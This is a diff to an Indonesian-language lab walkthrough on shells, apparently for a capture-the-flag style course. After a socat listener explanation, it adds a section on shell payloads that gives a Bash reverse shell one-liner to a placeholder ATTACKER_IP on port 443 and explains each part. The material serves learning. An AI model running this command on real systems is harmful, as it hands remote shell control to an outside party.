@@ -251,4 +251,31 @@ attacker@arch:~$ socat -d -d TCP-LISTEN:443 STDOUT
 - `TCP-LISTEN:443`: Bikin listener TCP di port 443.
 - `STDOUT`: Arahin data yang masuk ke layar terminal (Standard Output).
 
-Socat emang syntax-nya agak beda dan lebih kompleks, tapi fiturnya jauh lebih canggih daripada Netcat biasa.
+Socat syntax nya agak beda dan lebih kompleks, tapi fiturnya jauh lebih canggih daripada Netcat biasa.
+
+## Task 6: Shells Payloads
+
+Shell Payload itu command atau script yang kita jalanin di target buat ngebuka akses shell. Bisa buat reverse shell (ngirim koneksi) atau bind shell (nunggu koneksi).
+
+Kita bakal bahas beberapa payload populer di Linux.
+
+### Bash
+
+**Normal Bash Reverse Shell**
+
+Salah satu payload paling populer dan sering dipake di Linux adalah Bash reverse shell.
+
+Command-nya:
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+
+**Penjelasan Command:**
+
+- `bash -i`: Jalanin shell Bash secara **interaktif**.
+- `>&`: Redirect output (stdout) dan error (stderr) ke alamat yang sama.
+- `/dev/tcp/ATTACKER_IP/443`: Ini fitur unik Bash. Dia ngebuka koneksi TCP ke `ATTACKER_IP` di port `443`.
+- `0>&1`: Redirect input (stdin) ke stdout (yang udah tersambung ke koneksi TCP tadi).
+
+Intinya, command ini bikin input dan output shell Bash kita connect langsung ke komputer attacker lewat jaringan.
